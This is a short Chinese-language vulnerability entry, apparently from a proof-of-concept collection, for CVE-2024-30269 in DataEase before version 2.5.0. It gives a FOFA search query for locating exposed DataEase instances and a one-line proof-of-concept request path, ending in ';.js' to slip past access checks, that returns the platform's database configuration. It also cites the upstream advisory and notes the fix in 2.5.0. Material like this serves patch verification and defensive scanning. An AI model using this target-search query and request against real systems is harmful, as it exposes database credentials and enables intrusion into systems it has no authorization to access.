# DataEase存在数据库配置信息暴露漏洞(CVE-2024-30269)

DataEase是一个开源数据可视化和分析工具，在版本2.5.0之前存在数据库配置信息暴露漏洞。通过浏览器访问`/de2api/engine/getEngine;.js`路径可以获取平台的数据库配置。该漏洞已在v2.5.0中修复，除了升级之外，没有已知的解决方法。

## fofa

```javascript
body="Dataease"
```

## poc

```javascript
/de2api/engine/getEngine;.js
```

![image](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409251726851.png)

## 漏洞来源

- https://github.com/dataease/dataease/security/advisories/GHSA-8gvx-4qvj-6vv5